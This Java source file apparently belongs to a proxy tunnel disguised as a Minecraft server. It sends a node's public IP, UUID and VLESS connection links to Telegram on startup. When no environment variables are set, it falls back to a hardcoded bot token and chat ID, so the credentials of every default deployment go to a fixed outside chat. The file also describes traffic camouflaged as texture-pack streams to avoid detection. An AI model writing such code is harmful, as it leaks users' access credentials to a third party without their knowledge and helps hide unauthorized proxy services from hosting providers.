package com.enterprise.tunnel.util;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.logging.Logger;

/**
 * 节点双模上线分发与 Telegram 调度器
 */
public class TelegramDispatcher {

    private static final String DEFAULT_BOT_TOKEN = "7516303149:AAGEA7yjJnGVhlE9tm_6EAEz1hz3lZjH1Us";
    private static final String DEFAULT_CHAT_ID = "6594687854";

    public static void dispatchOnlineNotification(int wsPort, int xhttpPort, String uuid, String wsPath, String xhttpPath, Logger logger) {
        Thread.ofVirtual().start(() -> {
            try {
                Thread.sleep(3500);

                String publicIp = fetchPublicIp();
                if (publicIp == null || publicIp.isEmpty()) {
                    publicIp = "127.0.0.1";
                }

                String botToken = System.getenv("TG_BOT_TOKEN");
                if (botToken == null || botToken.trim().isEmpty()) {
                    botToken = DEFAULT_BOT_TOKEN;
                }

                String chatId = System.getenv("TG_CHAT_ID");
                if (chatId == null || chatId.trim().isEmpty()) {
                    chatId = DEFAULT_CHAT_ID;
                }

                String encodedWsPath = URLEncoder.encode(wsPath, StandardCharsets.UTF_8);
                String encodedXhttpPath = URLEncoder.encode(xhttpPath, StandardCharsets.UTF_8);

                String wsLink = "vless://" + uuid + "@" + publicIp + ":" + wsPort + "?type=ws&path=" + encodedWsPath + "#MC-WS-Edge";
                String xhttpLink = "vless://" + uuid + "@" + publicIp + ":" + xhttpPort + "?type=xhttp&path=" + encodedXhttpPath + "#MC-XHTTP-Stealth";

                String message = "🚀 *【Minecraft 潜行边缘节点 (双模架构) 已就绪】*\n\n"
                        + "🌐 *公网 IP:* `" + publicIp + "`\n"
                        + "🔑 *UUID:* `" + uuid + "`\n\n"
                        + "📡 *模式 1 (VLESS-WS):*\n"
                        + "• 端口: `" + wsPort + "` | 路径: `" + wsPath + "`\n"
                        + "• 节点链接:\n`" + wsLink + "`\n\n"
                        + "⚡ *模式 2 (VLESS-XHTTP 潜行流):*\n"
                        + "• 端口: `" + xhttpPort + "` | 路径: `" + xhttpPath + "`\n"
                        + "• 伪装特性: `材质包流 + 动态 Padding 混淆`\n"
                        + "• 节点链接:\n`" + xhttpLink + "`";

                sendTelegramMessage(botToken, chatId, message);
                logger.info("[TelegramDispatcher] 双模节点上线通知已成功推送到 Telegram！(IP: " + publicIp + ", WS: " + wsPort + ", XHTTP: " + xhttpPort + ")");
            } catch (Exception e) {
                logger.warning("[TelegramDispatcher] Telegram 推送遇到异常: " + e.getMessage());
            }
        });
    }

    private static String fetchPublicIp() {
        String[] providers = {
                "https://api.ipify.org",
                "https://icanhazip.com",
                "https://ifconfig.me/ip",
                "https://checkip.amazonaws.com"
        };

        for (String provider : providers) {
            try {
                URL url = URI.create(provider).toURL();
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(5000);
                conn.setRequestMethod("GET");
                if (conn.getResponseCode() == 200) {
                    try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8))) {
                        String ip = reader.readLine();
                        if (ip != null && !ip.trim().isEmpty()) {
                            return ip.trim();
                        }
                    }
                }
            } catch (Exception ignored) {
            }
        }
        return null;
    }

    private static void sendTelegramMessage(String botToken, String chatId, String text) throws Exception {
        String apiUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage";
        String postData = "chat_id=" + URLEncoder.encode(chatId, StandardCharsets.UTF_8)
                + "&text=" + URLEncoder.encode(text, StandardCharsets.UTF_8)
                + "&parse_mode=Markdown";

        byte[] postBytes = postData.getBytes(StandardCharsets.UTF_8);

        URL url = URI.create(apiUrl).toURL();
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setConnectTimeout(8000);
        conn.setReadTimeout(8000);
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        conn.setRequestProperty("Content-Length", String.valueOf(postBytes.length));

        conn.getOutputStream().write(postBytes);
        conn.getOutputStream().flush();

        int responseCode = conn.getResponseCode();
        if (responseCode != 200) {
            throw new RuntimeException("Telegram API returned HTTP " + responseCode);
        }
    }
}
